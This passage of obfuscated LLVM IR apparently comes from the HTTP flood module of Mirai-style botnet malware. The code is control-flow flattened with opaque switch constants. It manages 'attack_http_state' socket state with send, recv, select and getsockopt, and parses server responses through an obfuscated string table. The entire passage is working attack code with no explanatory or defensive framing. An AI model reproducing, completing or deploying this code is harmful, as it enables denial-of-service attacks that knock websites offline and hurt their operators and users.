  %905 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %904, i32 0, i32 10
  %906 = getelementptr inbounds [9 x i8], [9 x i8]* %905, i32 0, i32 0
  %907 = call i32 @util_strcpy(i8* %903, i8* %906)
  store i32 1827581757, i32* %switchVar
  br label %loopEnd

; <label>:908:                                    ; preds = %loopEntry
  %909 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %910 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %909, i32 0, i32 0
  %911 = load i32, i32* %910, align 4
  %912 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %913 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %914 = call i32 @util_strlen(i8* %913)
  %915 = sext i32 %914 to i64
  %916 = call i64 @send(i32 %911, i8* %912, i64 %915, i32 16384)
  %917 = load i32, i32* %27, align 4
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 3
  store i32 %917, i32* %919, align 4
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 1
  store i8 6, i8* %921, align 4
  %922 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %923 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %922, i32 0, i32 0
  %924 = load i32, i32* %923, align 4
  %925 = srem i32 %924, 64
  %926 = zext i32 %925 to i64
  %927 = shl i64 1, %926
  %928 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %929 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %930 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %929, i32 0, i32 0
  %931 = load i32, i32* %930, align 4
  %932 = sdiv i32 %931, 64
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds [16 x i64], [16 x i64]* %928, i64 0, i64 %933
  %935 = load i64, i64* %934, align 8
  %936 = or i64 %935, %927
  store i64 %936, i64* %934, align 8
  %937 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %937, i32 0, i32 0
  %939 = load i32, i32* %938, align 4
  %940 = load i32, i32* %23, align 4
  %941 = icmp sgt i32 %939, %940
  %942 = select i1 %941, i32 856550614, i32 -553010805
  store i32 %942, i32* %switchVar
  br label %loopEnd

; <label>:943:                                    ; preds = %loopEntry
  %944 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %945 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %944, i32 0, i32 0
  %946 = load i32, i32* %945, align 4
  %947 = add nsw i32 %946, 1
  store i32 %947, i32* %23, align 4
  store i32 -553010805, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  store i32 1640770324, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  %950 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %951 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %950, i32 0, i32 1
  %952 = load i8, i8* %951, align 4
  %953 = zext i8 %952 to i32
  %954 = icmp eq i32 %953, 6
  %955 = select i1 %954, i32 -1825516404, i32 -1728076269
  store i32 %955, i32* %switchVar
  br label %loopEnd

; <label>:956:                                    ; preds = %loopEntry
  %957 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %957, i32 0, i32 0
  %959 = load i32, i32* %958, align 4
  %960 = srem i32 %959, 64
  %961 = zext i32 %960 to i64
  %962 = shl i64 1, %961
  %963 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %964 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %964, i32 0, i32 0
  %966 = load i32, i32* %965, align 4
  %967 = sdiv i32 %966, 64
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds [16 x i64], [16 x i64]* %963, i64 0, i64 %968
  %970 = load i64, i64* %969, align 8
  %971 = or i64 %970, %962
  store i64 %971, i64* %969, align 8
  %972 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %973 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %972, i32 0, i32 0
  %974 = load i32, i32* %973, align 4
  %975 = load i32, i32* %23, align 4
  %976 = icmp sgt i32 %974, %975
  %977 = select i1 %976, i32 2062569925, i32 1854128927
  store i32 %977, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  %979 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %980 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 4
  %982 = add nsw i32 %981, 1
  store i32 %982, i32* %23, align 4
  store i32 1854128927, i32* %switchVar
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  store i32 1349899923, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %986 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %985, i32 0, i32 1
  %987 = load i8, i8* %986, align 4
  %988 = zext i8 %987 to i32
  %989 = icmp eq i32 %988, 7
  %990 = select i1 %989, i32 -1078152351, i32 -1907181179
  store i32 %990, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  %992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %992, i32 0, i32 0
  %994 = load i32, i32* %993, align 4
  %995 = srem i32 %994, 64
  %996 = zext i32 %995 to i64
  %997 = shl i64 1, %996
  %998 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %999 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1000 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %999, i32 0, i32 0
  %1001 = load i32, i32* %1000, align 4
  %1002 = sdiv i32 %1001, 64
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds [16 x i64], [16 x i64]* %998, i64 0, i64 %1003
  %1005 = load i64, i64* %1004, align 8
  %1006 = or i64 %1005, %997
  store i64 %1006, i64* %1004, align 8
  %1007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1007, i32 0, i32 0
  %1009 = load i32, i32* %1008, align 4
  %1010 = load i32, i32* %23, align 4
  %1011 = icmp sgt i32 %1009, %1010
  %1012 = select i1 %1011, i32 523266805, i32 966288890
  store i32 %1012, i32* %switchVar
  br label %loopEnd

; <label>:1013:                                   ; preds = %loopEntry
  %1014 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1014, i32 0, i32 0
  %1016 = load i32, i32* %1015, align 4
  %1017 = add nsw i32 %1016, 1
  store i32 %1017, i32* %23, align 4
  store i32 966288890, i32* %switchVar
  br label %loopEnd

; <label>:1018:                                   ; preds = %loopEntry
  store i32 -44814902, i32* %switchVar
  br label %loopEnd

; <label>:1019:                                   ; preds = %loopEntry
  %1020 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1021 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1020, i32 0, i32 1
  %1022 = load i8, i8* %1021, align 4
  %1023 = zext i8 %1022 to i32
  %1024 = icmp eq i32 %1023, 10
  %1025 = select i1 %1024, i32 974876330, i32 106474548
  store i32 %1025, i32* %switchVar
  br label %loopEnd

; <label>:1026:                                   ; preds = %loopEntry
  %1027 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1028 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1027, i32 0, i32 0
  %1029 = load i32, i32* %1028, align 4
  %1030 = srem i32 %1029, 64
  %1031 = zext i32 %1030 to i64
  %1032 = shl i64 1, %1031
  %1033 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1034 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1035 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1034, i32 0, i32 0
  %1036 = load i32, i32* %1035, align 4
  %1037 = sdiv i32 %1036, 64
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds [16 x i64], [16 x i64]* %1033, i64 0, i64 %1038
  %1040 = load i64, i64* %1039, align 8
  %1041 = or i64 %1040, %1032
  store i64 %1041, i64* %1039, align 8
  %1042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 4
  %1045 = load i32, i32* %23, align 4
  %1046 = icmp sgt i32 %1044, %1045
  %1047 = select i1 %1046, i32 -675029337, i32 -1018331988
  store i32 %1047, i32* %switchVar
  br label %loopEnd

; <label>:1048:                                   ; preds = %loopEntry
  %1049 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1050 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1049, i32 0, i32 0
  %1051 = load i32, i32* %1050, align 4
  %1052 = add nsw i32 %1051, 1
  store i32 %1052, i32* %23, align 4
  store i32 -1018331988, i32* %switchVar
  br label %loopEnd

; <label>:1053:                                   ; preds = %loopEntry
  store i32 -235344811, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1056 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1055, i32 0, i32 1
  %1057 = load i8, i8* %1056, align 4
  %1058 = zext i8 %1057 to i32
  %1059 = icmp eq i32 %1058, 11
  %1060 = select i1 %1059, i32 1677573524, i32 -178237626
  store i32 %1060, i32* %switchVar
  br label %loopEnd

; <label>:1061:                                   ; preds = %loopEntry
  %1062 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1063 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1062, i32 0, i32 1
  store i8 0, i8* %1063, align 4
  %1064 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1065 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1064, i32 0, i32 0
  %1066 = load i32, i32* %1065, align 4
  %1067 = call i32 @close(i32 %1066)
  %1068 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1068, i32 0, i32 0
  store i32 -1, i32* %1069, align 4
  store i32 529429631, i32* %switchVar
  br label %loopEnd

; <label>:1070:                                   ; preds = %loopEntry
  %1071 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1072 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1071, i32 0, i32 1
  store i8 0, i8* %1072, align 4
  %1073 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1074 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1073, i32 0, i32 0
  %1075 = load i32, i32* %1074, align 4
  %1076 = call i32 @close(i32 %1075)
  %1077 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1078 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1077, i32 0, i32 0
  store i32 -1, i32* %1078, align 4
  store i32 529429631, i32* %switchVar
  br label %loopEnd

; <label>:1079:                                   ; preds = %loopEntry
  store i32 -235344811, i32* %switchVar
  br label %loopEnd

; <label>:1080:                                   ; preds = %loopEntry
  store i32 -44814902, i32* %switchVar
  br label %loopEnd

; <label>:1081:                                   ; preds = %loopEntry
  store i32 1349899923, i32* %switchVar
  br label %loopEnd

; <label>:1082:                                   ; preds = %loopEntry
  store i32 1640770324, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  store i32 884065732, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  store i32 -190731631, i32* %switchVar
  br label %loopEnd

; <label>:1085:                                   ; preds = %loopEntry
  store i32 1385476733, i32* %switchVar
  br label %loopEnd

; <label>:1086:                                   ; preds = %loopEntry
  %1087 = load i32, i32* %9, align 4
  %1088 = add nsw i32 %1087, 1
  store i32 %1088, i32* %9, align 4
  store i32 943467540, i32* %switchVar
  br label %loopEnd

; <label>:1089:                                   ; preds = %loopEntry
  %1090 = load i32, i32* %23, align 4
  %1091 = icmp eq i32 %1090, 0
  %1092 = select i1 %1091, i32 -1431598495, i32 1928549589
  store i32 %1092, i32* %switchVar
  br label %loopEnd

; <label>:1093:                                   ; preds = %loopEntry
  store i32 1290577000, i32* %switchVar
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1095, align 8
  %1096 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1096, align 8
  %1097 = load i32, i32* %23, align 4
  %1098 = call i32 @select(i32 %1097, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1098, i32* %24, align 4
  %1099 = call i64 @time(i64* null) #6
  %1100 = trunc i64 %1099 to i32
  store i32 %1100, i32* %27, align 4
  %1101 = load i32, i32* %24, align 4
  %1102 = icmp slt i32 %1101, 1
  %1103 = select i1 %1102, i32 -273657019, i32 989492625
  store i32 %1103, i32* %switchVar
  br label %loopEnd

; <label>:1104:                                   ; preds = %loopEntry
  store i32 1290577000, i32* %switchVar
  br label %loopEnd

; <label>:1105:                                   ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1888894083, i32* %switchVar
  br label %loopEnd

; <label>:1106:                                   ; preds = %loopEntry
  %1107 = load i32, i32* %9, align 4
  %1108 = load i32, i32* %18, align 4
  %1109 = icmp slt i32 %1107, %1108
  %1110 = select i1 %1109, i32 -86179719, i32 1369614598
  store i32 %1110, i32* %switchVar
  br label %loopEnd

; <label>:1111:                                   ; preds = %loopEntry
  %1112 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1113 = load i32, i32* %9, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1112, i64 %1114
  store %struct.attack_http_state* %1115, %struct.attack_http_state** %26, align 8
  %1116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1116, i32 0, i32 0
  %1118 = load i32, i32* %1117, align 4
  %1119 = icmp eq i32 %1118, -1
  %1120 = select i1 %1119, i32 -983430407, i32 1724621593
  store i32 %1120, i32* %switchVar
  br label %loopEnd

; <label>:1121:                                   ; preds = %loopEntry
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:1122:                                   ; preds = %loopEntry
  %1123 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1124 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1125 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 4
  %1127 = sdiv i32 %1126, 64
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds [16 x i64], [16 x i64]* %1123, i64 0, i64 %1128
  %1130 = load i64, i64* %1129, align 8
  %1131 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1132 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1131, i32 0, i32 0
  %1133 = load i32, i32* %1132, align 4
  %1134 = srem i32 %1133, 64
  %1135 = zext i32 %1134 to i64
  %1136 = shl i64 1, %1135
  %1137 = and i64 %1130, %1136
  %1138 = icmp ne i64 %1137, 0
  %1139 = select i1 %1138, i32 856638087, i32 752753341
  store i32 %1139, i32* %switchVar
  br label %loopEnd

; <label>:1140:                                   ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1141 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1141, i32 0, i32 0
  %1143 = load i32, i32* %1142, align 4
  %1144 = bitcast i32* %35 to i8*
  %1145 = call i32 @getsockopt(i32 %1143, i32 1, i32 4, i8* %1144, i32* %36) #6
  store i32 %1145, i32* %12, align 4
  %1146 = load i32, i32* %35, align 4
  %1147 = icmp eq i32 %1146, 0
  %1148 = select i1 %1147, i32 743776619, i32 1710943846
  store i32 %1148, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i32, i32* %12, align 4
  %1151 = icmp eq i32 %1150, 0
  %1152 = select i1 %1151, i32 -1213396866, i32 1710943846
  store i32 %1152, i32* %switchVar
  br label %loopEnd

; <label>:1153:                                   ; preds = %loopEntry
  %1154 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1154, i32 0, i32 1
  store i8 4, i8* %1155, align 4
  store i32 1549165670, i32* %switchVar
  br label %loopEnd

; <label>:1156:                                   ; preds = %loopEntry
  %1157 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1157, i32 0, i32 0
  %1159 = load i32, i32* %1158, align 4
  %1160 = call i32 @close(i32 %1159)
  %1161 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1161, i32 0, i32 0
  store i32 -1, i32* %1162, align 4
  %1163 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1163, i32 0, i32 1
  store i8 0, i8* %1164, align 4
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:1165:                                   ; preds = %loopEntry
  store i32 752753341, i32* %switchVar
  br label %loopEnd

; <label>:1166:                                   ; preds = %loopEntry
  %1167 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1168 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1168, i32 0, i32 0
  %1170 = load i32, i32* %1169, align 4
  %1171 = sdiv i32 %1170, 64
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds [16 x i64], [16 x i64]* %1167, i64 0, i64 %1172
  %1174 = load i64, i64* %1173, align 8
  %1175 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1175, i32 0, i32 0
  %1177 = load i32, i32* %1176, align 4
  %1178 = srem i32 %1177, 64
  %1179 = zext i32 %1178 to i64
  %1180 = shl i64 1, %1179
  %1181 = and i64 %1174, %1180
  %1182 = icmp ne i64 %1181, 0
  %1183 = select i1 %1182, i32 1429051022, i32 -1870544277
  store i32 %1183, i32* %switchVar
  br label %loopEnd

; <label>:1184:                                   ; preds = %loopEntry
  %1185 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1185, i32 0, i32 1
  %1187 = load i8, i8* %1186, align 4
  %1188 = zext i8 %1187 to i32
  %1189 = icmp eq i32 %1188, 6
  %1190 = select i1 %1189, i32 1951529254, i32 1826073577
  store i32 %1190, i32* %switchVar
  br label %loopEnd

; <label>:1191:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  %1192 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1192, i32 10240)
  %1193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1193, i32 0, i32 0
  %1195 = load i32, i32* %1194, align 4
  %1196 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1197 = call i64 @recv(i32 %1195, i8* %1196, i64 10240, i32 16386)
  %1198 = trunc i64 %1197 to i32
  store i32 %1198, i32* %12, align 4
  %1199 = icmp slt i32 %1198, 1
  %1200 = select i1 %1199, i32 1123233221, i32 84172533
  store i32 %1200, i32* %switchVar
  br label %loopEnd

; <label>:1201:                                   ; preds = %loopEntry
  %1202 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1203 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1202, i32 0, i32 0
  %1204 = load i32, i32* %1203, align 4
  %1205 = call i32 @close(i32 %1204)
  %1206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1206, i32 0, i32 0
  store i32 -1, i32* %1207, align 4
  %1208 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1209 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1208, i32 0, i32 1
  store i8 0, i8* %1209, align 4
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:1210:                                   ; preds = %loopEntry
  %1211 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1212 = load i32, i32* %12, align 4
  %1213 = call i32 @util_memsearch(i8* %1211, i32 %1212, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1214 = icmp eq i32 %1213, -1
  %1215 = select i1 %1214, i32 777505019, i32 -2066768816
  store i32 %1215, i32* %switchVar
  br label %loopEnd

; <label>:1216:                                   ; preds = %loopEntry
  %1217 = load i32, i32* %12, align 4
  %1218 = icmp slt i32 %1217, 10240
  %1219 = select i1 %1218, i32 643394728, i32 -2066768816
  store i32 %1219, i32* %switchVar
  br label %loopEnd

; <label>:1220:                                   ; preds = %loopEntry
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:1221:                                   ; preds = %loopEntry
  %1222 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1223 = load i32, i32* %12, align 4
  %1224 = call i32 @util_memsearch(i8* %1222, i32 %1223, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1225
  store i8 0, i8* %1226, align 1
  %1227 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1228 = load i32, i32* %12, align 4
  %1229 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1230 = call i32 @util_stristr(i8* %1227, i32 %1228, i8* %1229)
  %1231 = icmp ne i32 %1230, -1
  %1232 = select i1 %1231, i32 -733104946, i32 1092573013
  store i32 %1232, i32* %switchVar
  br label %loopEnd

; <label>:1233:                                   ; preds = %loopEntry
  %1234 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1234, i32 0, i32 11
  store i32 2, i32* %1235, align 4
  store i32 1092573013, i32* %switchVar
  br label %loopEnd

; <label>:1236:                                   ; preds = %loopEntry
  %1237 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1238 = load i32, i32* %12, align 4
  %1239 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1240 = call i32 @util_stristr(i8* %1237, i32 %1238, i8* %1239)
  %1241 = icmp ne i32 %1240, -1
  %1242 = select i1 %1241, i32 -1550597312, i32 -1087713178
  store i32 %1242, i32* %switchVar
  br label %loopEnd

; <label>:1243:                                   ; preds = %loopEntry
  %1244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1244, i32 0, i32 11
  store i32 1, i32* %1245, align 4
  store i32 -1087713178, i32* %switchVar
  br label %loopEnd

; <label>:1246:                                   ; preds = %loopEntry
  %1247 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1247, i32 0, i32 12
  store i32 0, i32* %1248, align 4
  %1249 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1250 = load i32, i32* %12, align 4
  %1251 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1252 = call i32 @util_stristr(i8* %1249, i32 %1250, i8* %1251)
  %1253 = icmp ne i32 %1252, -1
  %1254 = select i1 %1253, i32 -2014489571, i32 2042724362
  store i32 %1254, i32* %switchVar
  br label %loopEnd

; <label>:1255:                                   ; preds = %loopEntry
  %1256 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1257 = load i32, i32* %12, align 4
  %1258 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1259 = call i32 @util_stristr(i8* %1256, i32 %1257, i8* %1258)
  store i32 %1259, i32* %38, align 4
  %1260 = load i32, i32* %38, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1261
  %1263 = load i8, i8* %1262, align 1
  %1264 = sext i8 %1263 to i32
  %1265 = icmp eq i32 %1264, 32
  %1266 = select i1 %1265, i32 -883376399, i32 1961087178
  store i32 %1266, i32* %switchVar
  br label %loopEnd

; <label>:1267:                                   ; preds = %loopEntry
  %1268 = load i32, i32* %38, align 4
  %1269 = add nsw i32 %1268, 1
  store i32 %1269, i32* %38, align 4
  store i32 1961087178, i32* %switchVar
  br label %loopEnd

; <label>:1270:                                   ; preds = %loopEntry
  %1271 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1272 = load i32, i32* %38, align 4
  %1273 = sext i32 %1272 to i64
  %1274 = getelementptr inbounds i8, i8* %1271, i64 %1273
  %1275 = load i32, i32* %12, align 4
  %1276 = load i32, i32* %38, align 4
  %1277 = sub nsw i32 %1275, %1276
  %1278 = call i32 @util_memsearch(i8* %1274, i32 %1277, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1278, i32* %39, align 4
  %1279 = load i32, i32* %39, align 4
  %1280 = icmp ne i32 %1279, -1
  %1281 = select i1 %1280, i32 -2136638147, i32 -531188943
  store i32 %1281, i32* %switchVar
  br label %loopEnd

; <label>:1282:                                   ; preds = %loopEntry
  %1283 = load i32, i32* %38, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1284
  store i8* %1285, i8** %40, align 8
  %1286 = load i32, i32* %39, align 4
  %1287 = icmp sge i32 %1286, 2
  %1288 = select i1 %1287, i32 -696517043, i32 1493237770
  store i32 %1288, i32* %switchVar
  br label %loopEnd

; <label>:1289:                                   ; preds = %loopEntry
  %1290 = load i32, i32* %39, align 4
  %1291 = sub nsw i32 %1290, 2
  store i32 %1291, i32* %39, align 4
  store i32 1493237770, i32* %switchVar
  br label %loopEnd

; <label>:1292:                                   ; preds = %loopEntry
  %1293 = load i32, i32* %38, align 4
  %1294 = load i32, i32* %39, align 4
  %1295 = add nsw i32 %1293, %1294
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1296
  store i8 0, i8* %1297, align 1
  %1298 = load i8*, i8** %40, align 8
  %1299 = load i8*, i8** %40, align 8
  %1300 = call i32 @util_strlen(i8* %1299)
  %1301 = call i8* @table_retrieve_val(i32 43, i32* null)
  %1302 = call i32 @util_stristr(i8* %1298, i32 %1300, i8* %1301)
  %1303 = icmp ne i32 %1302, 0
  %1304 = select i1 %1303, i32 1647891580, i32 -1278297363
  store i32 %1304, i32* %switchVar
  br label %loopEnd

; <label>:1305:                                   ; preds = %loopEntry
  %1306 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1306, i32 0, i32 12
  store i32 1, i32* %1307, align 4
  store i32 -1278297363, i32* %switchVar
  br label %loopEnd

; <label>:1308:                                   ; preds = %loopEntry
  store i32 -531188943, i32* %switchVar
  br label %loopEnd

; <label>:1309:                                   ; preds = %loopEntry
  store i32 2042724362, i32* %switchVar
  br label %loopEnd

; <label>:1310:                                   ; preds = %loopEntry
  %1311 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1312 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1311, i32 0, i32 13
  store i32 0, i32* %1312, align 4
  %1313 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1314 = load i32, i32* %12, align 4
  %1315 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1316 = call i32 @util_stristr(i8* %1313, i32 %1314, i8* %1315)
  %1317 = icmp ne i32 %1316, -1
  %1318 = select i1 %1317, i32 1813500657, i32 1945940457
  store i32 %1318, i32* %switchVar
  br label %loopEnd

; <label>:1319:                                   ; preds = %loopEntry
